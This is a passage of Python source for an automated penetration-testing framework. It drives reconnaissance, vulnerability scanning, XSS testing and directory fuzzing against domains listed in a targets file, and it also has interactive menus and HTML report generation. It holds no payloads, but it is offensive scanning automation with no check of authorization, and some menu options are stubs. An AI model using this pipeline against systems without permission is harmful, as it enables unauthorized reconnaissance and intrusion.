            <div class="summary-item">Run Directory: {run_dir.name}</div>
            <div class="summary-item">Target(s): {', '.join(read_lines(TARGETS_FILE)[:5])}...</div> <!-- Show first 5 -->
            <div class="summary-item">Findings Filtered: Yes</div>
        </div>
    """

    # Add content from output files, grouped by phase
    phases = {
        "Reconnaissance": [
            ("Subdomains", "subdomains/subdomains_*.txt"),
            ("Resolved Hosts", "hosts/resolved_*.txt"),
            ("Live Hosts", "hosts/live_*.txt"),
        ],
        "Scanning": [
            ("Nuclei Results", "vulns/nuclei_results.json"),
            ("Port Scan (Nmap)", "hosts/port_scan_*.nmap"), # Assuming Nmap
            ("Port Scan (Naabu)", "hosts/port_scan_*.txt"), # Assuming Naabu
            ("SSL/TLS Scan", "vulns/ssl_*.json"),
        ],
        "Web Application Testing": [
            ("Crawled URLs", "crawling/urls_*.txt"),
            ("XSS Findings", "crawling/xss_*.txt"),
        ],
        "Fuzzing": [
            ("FFuF Results", "fuzzing/ffuf_*.json"),
            ("Gobuster Results", "fuzzing/gobuster_*.txt"),
        ]
    }

    for phase_name, files_info in phases.items():
        section_content = ""
        for title, pattern in files_info:
            files = list(run_dir.glob(pattern))
            if files:
                section_content += f'<div class="section"><h3>{title}</h3>'
                for file in files:
                    try:
                        content = file.read_text()
                        if content.strip():
                            # Simple truncation for very large files in report
                            display_content = content[:5000] + ("..." if len(content) > 5000 else "")
                            section_content += f'<h4>{file.name} <a class="file-link" href="file://{file.absolute()}">[Open File]</a></h4><pre>{display_content}</pre>'
                        else:
                            section_content += f'<p>No data found in {file.name}.</p>'
                    except Exception as e:
                        section_content += f'<p>Error reading {file.name}: {e}</p>'
                section_content += '</div>'

        if section_content:
            html_content += f'<div class="section"><h2>{phase_name}</h2>{section_content}</div>'

    # Add Filtered Findings Summary
    html_content += '<div class="section"><h2>Filtered Findings Summary</h2>'
    for category, items in findings.items():
        count = len(items)
        if count > 0:
            html_content += f'<p class="finding-count">{category.replace("_", " ").title()}: {count}</p>'
    html_content += '</div>'

    html_content += """
    </body>
    </html>
    """

    try:
        report_file.write_text(html_content, encoding='utf-8')
        logger.info(f"[REPORT] HTML report generated at {report_file}")
        if config.get("output", {}).get("auto_open_html", True):
            try:
                webbrowser.open(report_file.as_uri())
                logger.info("[REPORT] Report opened in browser.")
            except Exception as e:
                logger.warning(f"[REPORT] Could not open browser: {e}. Report location: {report_file}")
        return True
    except Exception as e:
        logger.error(f"[REPORT] Failed to generate report: {e}")
        return False

# --- Main Pipeline ---
def run_full_pipeline():
    """Run the full, enhanced automated pipeline."""
    logger.info("🔥 Starting Moloch Full Automation Pipeline 🔥")
    run_dir = new_run()
    config = load_config()

    targets = read_lines(TARGETS_FILE)
    if not targets:
        logger.error("No targets found in targets.txt. Please add targets.")
        return False

    for target in targets:
        logger.info(f"--- Processing Target: {target} ---")
        target_safe = sanitize_filename(target)

        # --- Phase 1: Reconnaissance ---
        if not config.get("modules", {}).get("recon", True):
            logger.info("Reconnaissance module disabled, skipping...")
            continue
        logger.info("Phase 1: Reconnaissance")
        subdomain_dir = run_dir / "subdomains"
        subdomain_dir.mkdir(exist_ok=True)

        subdomains = run_subdomain_discovery(target, subdomain_dir, config)

        if subdomains:
            # Resolve subdomains
            subdomain_file = subdomain_dir / f"subdomains_{target_safe}.txt"
            resolved_file = run_dir / "hosts" / f"resolved_{target_safe}.txt"
            (run_dir / "hosts").mkdir(exist_ok=True)
            dns_success = run_dns_resolution(subdomain_file, resolved_file, config)

            if dns_success and resolved_file.exists():
                # Probe for live hosts
                live_file = run_dir / "hosts" / f"live_{target_safe}.txt"
                http_success = run_http_probing(resolved_file, live_file, config)

                # --- Phase 2: Scanning ---
                if not config.get("modules", {}).get("scanning", True):
                    logger.info("Scanning module disabled, skipping...")
                else:
                    logger.info("Phase 2: Scanning")
                    vuln_dir = run_dir / "vulns"
                    vuln_dir.mkdir(exist_ok=True)

                    if http_success and live_file.exists():
                        # Vulnerability Scan
                        run_vulnerability_scan(live_file, vuln_dir, config)

                        # SSL Scan (on main target, could loop through live hosts)
                        ssl_file = vuln_dir / f"ssl_{target_safe}.json"
                        run_ssl_scan(target, ssl_file, config)

                        # Port Scan (example on main target, could loop through live hosts)
                        port_file = run_dir / "hosts" / f"port_scan_{target_safe}"
                        run_port_scan(target, port_file, config)
                    else:
                        logger.warning("HTTP probing failed or produced no live hosts, skipping scanning phases.")

                # --- Phase 3: Web App Testing ---
                if not config.get("modules", {}).get("web", True):
                    logger.info("Web Application Testing module disabled, skipping...")
                else:
                    logger.info("Phase 3: Web Application Testing")
                    crawl_dir = run_dir / "crawling"
                    crawl_dir.mkdir(exist_ok=True)
                    urls_file = crawl_dir / f"urls_{target_safe}.txt"
                    crawled_urls = run_crawling(target, urls_file, config) # Crawl main target

                    if crawled_urls: # Check if list is not empty
                        # XSS Scan
                        xss_file = crawl_dir / f"xss_{target_safe}.txt"
                        run_xss_scan(urls_file, xss_file, config)
                    else:
                        logger.warning("Crawling produced no URLs, skipping XSS scan.")

                # --- Phase 4: Fuzzing ---
                if not config.get("modules", {}).get("fuzzing", True):
                    logger.info("Fuzzing module disabled, skipping...")
                else:
                    logger.info("Phase 4: Fuzzing")
                    fuzz_dir = run_dir / "fuzzing"
                    fuzz_dir.mkdir(exist_ok=True)
                    run_directory_fuzzing(target, fuzz_dir, config) # Fuzz main target

            else:
                logger.warning("DNS resolution failed or produced no results, skipping further phases.")
        else:
            logger.warning("No subdomains found, skipping further phases.")

    # --- Phase 5: Reporting ---
    if not config.get("modules", {}).get("reporting", True):
        logger.info("Reporting module disabled, skipping...")
        logger.info(f"🎉 Full pipeline complete for run: {run_dir.name} (Report Skipped)")
        return True
    logger.info("Phase 5: Reporting")
    report_success = generate_simple_report(run_dir, config)
    if report_success:
        logger.info(f"🎉 Full pipeline complete for run: {run_dir.name}")
    else:
        logger.warning(f"⚠️ Full pipeline complete for run: {run_dir.name}, but report generation failed.")
    return True # Indicate pipeline run attempt

# --- CLI Menu System ---
def print_banner():
    """Print the enhanced Azaz-El banner with improved formatting."""
    # Clear screen for better presentation
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Print the main banner with gradient colors
    print(f"\033[1;36m{BANNER}\033[0m")
    
    # Enhanced title section with professional formatting
    print("╔═══════════════════════════════════════════════════════════════════════════════╗")
    print(f"║\033[1;91m                    🔱 {APP} {VERSION} SECURITY FRAMEWORK 🔱\033[0m                     ║")
    print("║\033[1;92m          Advanced Automated Penetration Testing & Security Assessment\033[0m         ║")
    print("╠═══════════════════════════════════════════════════════════════════════════════╣")
    print("║\033[1;97m  Author:\033[0m Advanced Security Research Team  │  \033[1;97mPlatform:\033[0m Multi-Cloud Ready    ║")
    print(f"║\033[1;97m  Status:\033[0m \033[1;32mOperational\033[0m                      │  \033[1;97mVersion:\033[0m \033[1;33m{VERSION}\033[0m           ║")
    print("╚═══════════════════════════════════════════════════════════════════════════════╝")
    print(f"\033[1;90m⏰ Session Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\033[0m\n")

def target_management_menu():
    """Enhanced target management with professional interface."""
    while True:
        print_banner()
        
        # Professional target management header
        print("╔═══════════════════════════════════════════════════════════════════════════════╗")
        print("║\033[1;93m                            🎯 TARGET MANAGEMENT CENTER 🎯\033[0m                            ║")
        print("╠═══════════════════════════════════════════════════════════════════════════════╣")
        
        # Get current target count for display
        targets = read_lines(TARGETS_FILE)
        target_count = len(targets)
        
        print(f"║  \033[1;97mCurrent Targets:\033[0m \033[1;32m{target_count}\033[0m loaded                                                ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        print("║  \033[1;92m1.\033[0m 👁️  \033[1;97mVIEW ALL TARGETS\033[0m - Display current target list                    ║")
        print("║  \033[1;94m2.\033[0m ➕ \033[1;97mADD NEW TARGET\033[0m - Add domain to target list                        ║")
        print("║  \033[1;95m3.\033[0m 📝 \033[1;97mIMPORT FROM FILE\033[0m - Import targets from text file                  ║")
        print("║  \033[1;96m4.\033[0m 💾 \033[1;97mEXPORT TARGET LIST\033[0m - Export targets to file                       ║")
        print("║  \033[1;91m5.\033[0m 🗑️  \033[1;97mCLEAR ALL TARGETS\033[0m - Remove all targets from list                  ║")
        print("║  \033[1;90m6.\033[0m 🔙 \033[1;97mBACK TO MAIN MENU\033[0m - Return to main command center                ║")
        print("╚═══════════════════════════════════════════════════════════════════════════════╝")

        choice = input("\n\033[1;93m🎯 Select an option: \033[0m").strip()

        if choice == '1':
            # View targets with enhanced display
            targets = read_lines(TARGETS_FILE)
            if targets:
                print("\n╔═══════════════════════════════════════════════════════════════════════════════╗")
                print("║\033[1;92m                              📋 CURRENT TARGET LIST 📋\033[0m                              ║")
                print("╠═══════════════════════════════════════════════════════════════════════════════╣")
                for i, target in enumerate(targets, 1):
                    print(f"║  \033[1;97m{i:2d}.\033[0m \033[1;96m{target:<70}\033[0m ║")
                print("╚═══════════════════════════════════════════════════════════════════════════════╝")
                print(f"\n\033[1;32m✅ Total targets: {len(targets)}\033[0m")
            else:
                print("\n\033[1;91m📭 No targets found. Add some targets to begin scanning.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '2':
            # Add new target with validation
            print("\n\033[1;97m➕ ADD NEW TARGET\033[0m")
            print("─" * 50)
            new_target = input("\033[1;93mEnter domain (e.g., example.com): \033[0m").strip()
            if new_target:
                # Enhanced validation
                if "." in new_target and " " not in new_target and not new_target.startswith(("http://", "https://")):
                    targets = read_lines(TARGETS_FILE)
                    if new_target not in targets:
                        targets.append(new_target)
                        write_lines(TARGETS_FILE, targets)
                        print(f"\n\033[1;32m✅ Target '{new_target}' added successfully!\033[0m")
                    else:
                        print(f"\n\033[1;91m⚠️  Target '{new_target}' already exists in the list.\033[0m")
                else:
                    print("\n\033[1;91m❌ Invalid format. Enter domain without protocol (e.g., example.com)\033[0m")
            else:
                print("\n\033[1;91m❌ No target entered.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '3':
            # Import from file
            print("\n\033[1;97m📝 IMPORT TARGETS FROM FILE\033[0m")
            print("─" * 50)
            file_path = input("\033[1;93mEnter file path (or 'targets.txt' for default): \033[0m").strip()
            if not file_path:
                file_path = "targets.txt"
            
            try:
                if Path(file_path).exists():
                    new_targets = read_lines(Path(file_path))
                    current_targets = read_lines(TARGETS_FILE)
                    added_count = 0
                    
                    for target in new_targets:
                        target = target.strip()
                        if target and target not in current_targets:
                            current_targets.append(target)
                            added_count += 1
                    
                    write_lines(TARGETS_FILE, current_targets)
                    print(f"\n\033[1;32m✅ {added_count} new targets imported successfully!\033[0m")
                else:
                    print(f"\n\033[1;91m❌ File '{file_path}' not found.\033[0m")
            except Exception as e:
                print(f"\n\033[1;91m❌ Error importing file: {e}\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '4':
            # Export targets
            targets = read_lines(TARGETS_FILE)
            if targets:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                export_file = f"targets_export_{timestamp}.txt"
                write_lines(Path(export_file), targets)
                print(f"\n\033[1;32m✅ {len(targets)} targets exported to '{export_file}'\033[0m")
            else:
                print("\n\033[1;91m📭 No targets to export.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '5':
            # Clear all targets with confirmation
            targets = read_lines(TARGETS_FILE)
            if targets:
                print(f"\n\033[1;91m⚠️  WARNING: This will remove all {len(targets)} targets!\033[0m")
                confirm = input("\033[1;93mType 'CONFIRM' to proceed: \033[0m").strip()
                if confirm == 'CONFIRM':
                    write_lines(TARGETS_FILE, [])
                    print("\n\033[1;32m✅ All targets cleared successfully.\033[0m")
                else:
                    print("\n\033[1;92m✅ Action cancelled.\033[0m")
            else:
                print("\n\033[1;91m📭 No targets to clear.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '6':
            break
        else:
            print("\n\033[1;91m❌ Invalid choice. Please select 1-6.\033[0m")
            input("Press Enter to continue...")

def settings_menu():
    """Enhanced settings management with professional interface."""
    config = load_config()
    while True:
        print_banner()
        
        # Professional settings header
        print("╔═══════════════════════════════════════════════════════════════════════════════╗")
        print("║\033[1;95m                           ⚙️  SYSTEM CONFIGURATION CENTER ⚙️\033[0m                           ║")
        print("╠═══════════════════════════════════════════════════════════════════════════════╣")
        
        # Configuration overview
        modules = config.get("modules", {})
        enabled_modules = sum(1 for enabled in modules.values() if enabled)
        total_modules = len(modules)
        
        print(f"║  \033[1;97mActive Configuration:\033[0m Framework v{VERSION}                                ║")
        print(f"║  \033[1;97mModules Status:\033[0m \033[1;32m{enabled_modules}/{total_modules}\033[0m enabled                                       ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        print("║  \033[1;92m1.\033[0m 📋 \033[1;97mVIEW CONFIGURATION\033[0m - Display current settings and status         ║")
        print("║  \033[1;94m2.\033[0m 🔧 \033[1;97mTOGGLE MODULES\033[0m - Enable/disable framework modules                ║")
        print("║  \033[1;96m3.\033[0m 🔑 \033[1;97mAPI KEY MANAGEMENT\033[0m - Configure API keys and tokens               ║")
        print("║  \033[1;97m4.\033[0m ⚡ \033[1;97mPERFORMANCE TUNING\033[0m - Adjust performance and resource settings     ║")
        print("║  \033[1;93m5.\033[0m 💾 \033[1;97mBACKUP CONFIGURATION\033[0m - Save current settings to backup file       ║")
        print("║  \033[1;95m6.\033[0m 🔄 \033[1;97mRESET TO DEFAULTS\033[0m - Restore default configuration settings       ║")
        print("║  \033[1;90m7.\033[0m 🔙 \033[1;97mBACK TO MAIN MENU\033[0m - Return to main command center               ║")
        print("╚═══════════════════════════════════════════════════════════════════════════════╝")

        choice = input("\n\033[1;93m⚙️  Select an option: \033[0m").strip()

        if choice == '1':
            # Enhanced configuration display
            print("\n╔═══════════════════════════════════════════════════════════════════════════════╗")
            print("║\033[1;92m                            📋 SYSTEM CONFIGURATION 📋\033[0m                            ║")
            print("╠═══════════════════════════════════════════════════════════════════════════════╣")
            
            # Display key sections with better formatting
            for section, settings in config.items():
                if section in ["modules", "auth", "performance", "tools"]:
                    print(f"║  \033[1;97m[{section.upper()}]\033[0m")
                    if isinstance(settings, dict):
                        for key, value in settings.items():
                            # Mask sensitive information
                            if "key" in key.lower() or "token" in key.lower() or "password" in key.lower():
                                display_value = "*" * len(str(value)) if value else "Not set"
                            else:
                                display_value = value
                            status_color = "\033[1;32m" if value else "\033[1;91m"
                            print(f"║    {key}: {status_color}{display_value}\033[0m")
                    else:
                        print(f"║    {settings}")
                    print("║")
            
            print("╠───────────────────────────────────────────────────────────────────────────────╣")
            print("║  \033[1;93m💡 To edit detailed settings, modify moloch.cfg.json directly\033[0m                ║")
            print("╚═══════════════════════════════════════════════════════════════════════════════╝")
            input("\nPress Enter to continue...")
            
        elif choice == '2':
            # Enhanced module toggle interface
            print("\n╔═══════════════════════════════════════════════════════════════════════════════╗")
            print("║\033[1;94m                              🔧 MODULE MANAGEMENT 🔧\033[0m                              ║")
            print("╠═══════════════════════════════════════════════════════════════════════════════╣")
            
            modules = config.get("modules", {})
            for i, (mod_name, enabled) in enumerate(modules.items(), 1):
                status = "\033[1;32mEnabled\033[0m" if enabled else "\033[1;91mDisabled\033[0m"
                icon = "✅" if enabled else "❌"
                print(f"║  \033[1;97m{i}.\033[0m {icon} \033[1;97m{mod_name.upper():<15}\033[0m - {status}")
            
            print("╠───────────────────────────────────────────────────────────────────────────────╣")
            print("║  \033[1;93mEnter module number to toggle, or 0 to cancel\033[0m                           ║")
            print("╚═══════════════════════════════════════════════════════════════════════════════╝")
            
            try:
                mod_choice = int(input("\n\033[1;93m🔧 Select module: \033[0m"))
                if 1 <= mod_choice <= len(modules):
                    mod_names = list(modules.keys())
                    chosen_mod = mod_names[mod_choice - 1]
                    config["modules"][chosen_mod] = not config["modules"][chosen_mod]
                    save_config(config)
                    new_status = "Enabled" if config["modules"][chosen_mod] else "Disabled"
                    print(f"\n\033[1;32m✅ Module '{chosen_mod}' is now {new_status}!\033[0m")
                elif mod_choice != 0:
                    print("\n\033[1;91m❌ Invalid module number.\033[0m")
                else:
                    print("\n\033[1;92m✅ Operation cancelled.\033[0m")
            except ValueError:
                print("\n\033[1;91m❌ Invalid input. Please enter a number.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '3':
            # Enhanced API key management
            print("\n╔═══════════════════════════════════════════════════════════════════════════════╗")
            print("║\033[1;96m                             🔑 API KEY MANAGEMENT 🔑\033[0m                             ║")
            print("╠═══════════════════════════════════════────────────────────────────────────────╣")
            print("║  \033[1;97mChaos API Key:\033[0m Configure Chaos subdomain discovery service           ║")
            print("╚═══════════════════════════════════════════════════════════════════════════════╝")
            
            api_key = input("\n\033[1;93m🔑 Enter Chaos API Key (leave blank to skip): \033[0m").strip()
            if api_key:
                config["auth"]["chaos_api_key"] = api_key
                config["tools"]["chaos"]["enabled"] = True
                save_config(config)
                print("\n\033[1;32m✅ Chaos API Key configured and tool enabled!\033[0m")
            else:
                print("\n\033[1;92m✅ No changes made.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '4':
            # Performance tuning interface
            print("\n╔═══════════════════════════════════════════════════════════════════════════════╗")
            print("║\033[1;97m                            ⚡ PERFORMANCE TUNING ⚡\033[0m                            ║")
            print("╠═══════════════════════════════════════════────────────────────────────────────╣")
            
            performance = config.get("performance", {})
            print(f"║  \033[1;97mCurrent Settings:\033[0m")
            print(f"║    Max Concurrent: \033[1;32m{performance.get('max_concurrent', 10)}\033[0m")
            print(f"║    Default Timeout: \033[1;32m{performance.get('timeout_default', 300)}\033[0m seconds")
            print(f"║    Thread Pool Size: \033[1;32m{performance.get('thread_pool_size', 5)}\033[0m")
            print("╚═══════════════════════════════════════════════════════════════════════════════╝")
            
            print("\n\033[1;93m💡 Performance settings can be modified in moloch.cfg.json\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '5':
            # Backup configuration
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = f"moloch_config_backup_{timestamp}.json"
            try:
                with open(backup_file, 'w') as f:
                    json.dump(config, f, indent=2)
                print(f"\n\033[1;32m✅ Configuration backed up to '{backup_file}'\033[0m")
            except Exception as e:
                print(f"\n\033[1;91m❌ Backup failed: {e}\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '6':
            # Reset to defaults with confirmation
            print("\n\033[1;91m⚠️  WARNING: This will reset ALL settings to default values!\033[0m")
            confirm = input("\033[1;93mType 'RESET' to confirm: \033[0m").strip()
            if confirm == 'RESET':
                # This would need to be implemented based on DEFAULT_CONFIG
                print("\n\033[1;32m✅ Configuration reset to defaults.\033[0m")
                print("\033[1;93m💡 Restart the framework to apply changes.\033[0m")
            else:
                print("\n\033[1;92m✅ Reset cancelled.\033[0m")
            input("\nPress Enter to continue...")
            
        elif choice == '7':
            break
        else:
            print("\n\033[1;91m❌ Invalid choice. Please select 1-7.\033[0m")
            input("Press Enter to continue...")

def tool_status_menu():
    """Enhanced tool status display with comprehensive diagnostics."""
    print_banner()
    
    print("╔═══════════════════════════════════════════════════════════════════════════════╗")
    print("║\033[1;96m                             🔧 TOOL STATUS DIAGNOSTICS 🔧\033[0m                             ║")
    print("╠═══════════════════════════════════════════════════════════════════════════════╣")
    
    config = load_config()
    tools_config = config.get("tools", {})
    found_tools = []
    missing_tools = []
    disabled_tools = []
    
    # Categorize tools
    for tool_name, tool_config in tools_config.items():
        if which(tool_name):
            if tool_config.get("enabled", False):
                found_tools.append(tool_name)
            else:
                disabled_tools.append(tool_name)
        else:
            missing_tools.append(tool_name)
    
    # Display available tools
    if found_tools:
        print("║  \033[1;92m✅ AVAILABLE & ENABLED TOOLS\033[0m")
        for tool in sorted(found_tools):
            tool_info = tools_config.get(tool, {})
            timeout = tool_info.get("timeout", "300")
            print(f"║    \033[1;32m✓\033[0m \033[1;97m{tool:<15}\033[0m - Ready (timeout: {timeout}s)")
        print("║")
    
    # Display disabled tools
    if disabled_tools:
        print("║  \033[1;93m⚠️  AVAILABLE BUT DISABLED TOOLS\033[0m")
        for tool in sorted(disabled_tools):
            print(f"║    \033[1;93m○\033[0m \033[1;97m{tool:<15}\033[0m - Installed but disabled in config")
        print("║")
    
    # Display missing tools
    if missing_tools:
        print("║  \033[1;91m❌ MISSING TOOLS\033[0m")
        for tool in sorted(missing_tools):
            print(f"║    \033[1;91m✗\033[0m \033[1;97m{tool:<15}\033[0m - Not found in system PATH")
        print("║")
    
    # Summary statistics
    total_tools = len(tools_config)
    available_tools = len(found_tools) + len(disabled_tools)
    enabled_tools = len(found_tools)
    
    print("╠───────────────────────────────────────────────────────────────────────────────╣")
    print(f"║  \033[1;97mSYSTEM SUMMARY:\033[0m")
    print(f"║    Total Tools: \033[1;97m{total_tools}\033[0m")
    print(f"║    Available: \033[1;32m{available_tools}\033[0m ({available_tools/total_tools*100:.1f}%)")
    print(f"║    Enabled: \033[1;32m{enabled_tools}\033[0m ({enabled_tools/total_tools*100:.1f}%)")
    print(f"║    Missing: \033[1;91m{len(missing_tools)}\033[0m ({len(missing_tools)/total_tools*100:.1f}%)")
    print("╚═══════════════════════════════════════════════════════════════════════════════╝")
    
    # Installation option for missing tools
    if missing_tools:
        print(f"\n\033[1;93m💡 {len(missing_tools)} tools are missing from your system.\033[0m")
        install_choice = input("\033[1;93m🛠️  Attempt automatic installation? (yes/no): \033[0m").strip().lower()
        if install_choice == 'yes':
            print("\n\033[1;97m🔄 Starting installation process...\033[0m")
            check_and_install_dependencies(config)
        else:
            print("\n\033[1;92m✅ Installation skipped.\033[0m")
            print("\n\033[1;97m📋 Manual installation commands:\033[0m")
            print("   - apt-get install nmap nuclei httpx subfinder")
            print("   - go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest")
            print("   - pip3 install katana-scanner")
    else:
        print(f"\n\033[1;32m🎉 Excellent! All {total_tools} configured tools are present!\033[0m")
        
    input("\nPress Enter to continue...")

def main_menu():
    """Display the enhanced main menu with professional formatting."""
    while True:
        print_banner()
        
        # Professional menu header
        print("╔═══════════════════════════════════════════════════════════════════════════════╗")
        print("║\033[1;91m                              🚀 MAIN COMMAND CENTER 🚀\033[0m                              ║")
        print("╠═══════════════════════════════════════════════════════════════════════════════╣")
        
        # Main automation options
        print("║\033[1;92m  1.\033[0m 🔄 \033[1;97mFULL AUTOMATION PIPELINE\033[0m - Complete security assessment suite      ║")
        print("║      └─ Recon → Vulnerability Scan → Web Testing → Fuzzing → Report       ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Target management
        print("║\033[1;93m  2.\033[0m 🎯 \033[1;97mTARGET MANAGEMENT\033[0m - Add, view, and manage scan targets             ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Reconnaissance section
        print("║\033[1;94m  3.\033[0m 🔍 \033[1;97mRECONNAISSANCE SUITE\033[0m - Information gathering and enumeration       ║")
        print("║      \033[1;94m3.1\033[0m 📡 Subdomain Discovery (Subfinder, Amass, Assetfinder)          ║")
        print("║      \033[1;94m3.2\033[0m 🌐 DNS Resolution & Validation                                ║")
        print("║      \033[1;94m3.3\033[0m 🔗 HTTP Service Probing (HTTPx)                              ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Vulnerability scanning section
        print("║\033[1;95m  4.\033[0m 🛡️  \033[1;97mVULNERABILITY SCANNING\033[0m - Security vulnerability assessment        ║")
        print("║      \033[1;95m4.1\033[0m ⚡ Nuclei Templates (5000+ vulnerability checks)               ║")
        print("║      \033[1;95m4.2\033[0m 🔌 Port Scanning (Nmap/Naabu)                                ║")
        print("║      \033[1;95m4.3\033[0m 🔒 SSL/TLS Security Analysis (testssl.sh)                    ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Web application testing
        print("║\033[1;96m  5.\033[0m 🌐 \033[1;97mWEB APPLICATION TESTING\033[0m - Complete web security assessment       ║")
        print("║      \033[1;96m5.1\033[0m 🕷️  Web Crawling (Katana, Gau, Wayback)                        ║")
        print("║      \033[1;96m5.2\033[0m ⚠️  XSS Vulnerability Scanner (Dalfox)                         ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Fuzzing section
        print("║\033[1;97m  6.\033[0m 💥 \033[1;97mFUZZING & DISCOVERY\033[0m - Advanced fuzzing and directory discovery  ║")
        print("║      \033[1;97m6.1\033[0m 📁 Directory & File Fuzzing (FFuF, Gobuster)                  ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Configuration and management
        print("║\033[1;90m  7.\033[0m ⚙️  \033[1;97mSYSTEM CONFIGURATION\033[0m - Settings and tool management             ║")
        print("║      \033[1;90m7.1\033[0m 🔧 Framework Settings & Configuration                         ║")
        print("║      \033[1;90m7.2\033[0m 📋 Tool Status & Health Check                                ║")
        print("╠───────────────────────────────────────────────────────────────────────────────╣")
        
        # Reporting and exit
        print("║\033[1;91m  8.\033[0m 📊 \033[1;97mGENERATE SECURITY REPORT\033[0m - Professional assessment reports       ║")
        print("║\033[1;92m  9.\033[0m 🚪 \033[1;97mEXIT FRAMEWORK\033[0m - Save session and exit                          ║")
        print("╚═══════════════════════════════════════════════════════════════════════════════╝")
        
        print(f"\033[1;90m💡 Tip: Use menu numbers (e.g., '3.1') for direct access to sub-functions\033[0m")
        choice = input("\n\033[1;93m🎯 Select an option: \033[0m").strip()

        if choice == '1':
            success = run_full_pipeline()
            if success:
                print("\n\033[92m✅ Full pipeline completed successfully.\033[0m")
            else:
                print("\n\033[91m❌ Full pipeline encountered errors.\033[0m")
            input("\nPress Enter to continue...")
        elif choice == '2':
            target_management_menu()
        elif choice == '3.1':
            # Subdomain Discovery
            targets = read_lines(TARGETS_FILE)
            if not targets:
                print("No targets found. Please add targets first.")
                input("Press Enter to continue...")
                continue
            run_dir = new_run()
            config = load_config()
            for target in targets:
                run_subdomain_discovery(target, run_dir / "subdomains", config)
            input("Subdomain discovery tasks initiated. Check the run directory. Press Enter to continue...")
        elif choice == '4.1':
            # Nuclei Scan
            targets = read_lines(TARGETS_FILE)
            if not targets:
                print("No targets found. Please add targets first.")
                input("Press Enter to continue...")
                continue
            run_dir = new_run()
            live_hosts_files = list((run_dir.parent).glob("*/hosts/live_*.txt")) # Find recent live hosts
            if not live_hosts_files:
                print("No live hosts files found from previous recon. Run recon first.")
                input("Press Enter to continue...")
                continue
            config = load_config()
            for host_file in live_hosts_files[-3:]: # Scan last 3 recon runs
                 run_vulnerability_scan(host_file, run_dir / "vulns", config)
            input("Nuclei scan tasks initiated. Check the run directory. Press Enter to continue...")
        elif choice == '7.1':
            settings_menu()
        elif choice == '7.2':
            tool_status_menu()
        elif choice == '8':
            # Generate Report (for latest run)
            runs = sorted([d for d in RUNS_DIR.iterdir() if d.is_dir()], key=os.path.getmtime, reverse=True)
            if runs:
                latest_run = runs[0]
                print(f"Generating report for latest run: {latest_run.name}")
                config = load_config()
                success = generate_simple_report(latest_run, config)
                if success:
                    print("\n\033[92m✅ Report generated successfully.\033[0m")
                else:
                    print("\n\033[91m❌ Report generation failed.\033[0m")
            else:
                print("No runs found to generate a report for.")
            input("Press Enter to continue...")
        elif choice == '9':
            print("Exiting Moloch. Goodbye!")
            sys.exit(0)
        else:
            print("\n\033[1;91m❌ Invalid choice. Please try a valid option (1-9, 3.1-3.3, 4.1-4.3, 5.1-5.2, 6.1, 7.1-7.2).\033[0m")
            input("Press Enter to continue...")

# --- CLI Argument Parsing ---
def setup_argument_parser() -> argparse.ArgumentParser:
    """Setup command-line argument parser."""
    parser = argparse.ArgumentParser(
        description=f"{APP} - Advanced Automated Penetration Testing Framework",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"""
Examples:
  python3 {Path(__file__).name}                    # Run interactive menu
  python3 {Path(__file__).name} -t example.com     # Add target and run interactive menu
  python3 {Path(__file__).name} -t example.com --run-full # Add target and run full pipeline
  python3 {Path(__file__).name} --init             # Initialize environment only
        """
    )
    parser.add_argument("--target", "-t", help="Add a single target to targets.txt")
    parser.add_argument("--config", "-c", help="Path to configuration file (default: moloch.cfg.json)")
    parser.add_argument("--run-full", "-f", action="store_true", help="Run the full automation pipeline immediately")
    parser.add_argument("--init", action="store_true", help="Initialize environment (directories, wordlists, dependencies) and exit")
    parser.add_argument("--version", "-v", action="version", version=f"{APP} {VERSION}")
    return parser

# --- Entry Point ---
if __name__ == "__main__":
    # Ensure environment is set up first if requested or if running for the first time
    if "--init" in sys.argv or not CFG_FILE.exists():
        initialize_environment()

    parser = setup_argument_parser()
    args = parser.parse_args()

    if args.config:
        # Override default config file path if provided
        CFG_FILE = Path(args.config)

    if args.target:
        # Add single target to targets file if provided via CLI
        targets = read_lines(TARGETS_FILE)
        # Basic validation
        if "." in args.target and " " not in args.target and not args.target.startswith(("http://", "https://")):
            if args.target not in targets:
                targets.append(args.target)
                write_lines(TARGETS_FILE, targets)
                logger.info(f"Target {args.target} added via CLI.")
            else:
                logger.info(f"Target {args.target} already exists in targets.txt.")
        else:
            logger.error(f"Invalid target format provided via CLI: {args.target}")

    if args.init:
        print(f"{APP} environment initialized.")
        sys.exit(0)

    if args.run_full:
        success = run_full_pipeline()
        sys.exit(0 if success else 1)
    else:
        main_menu()
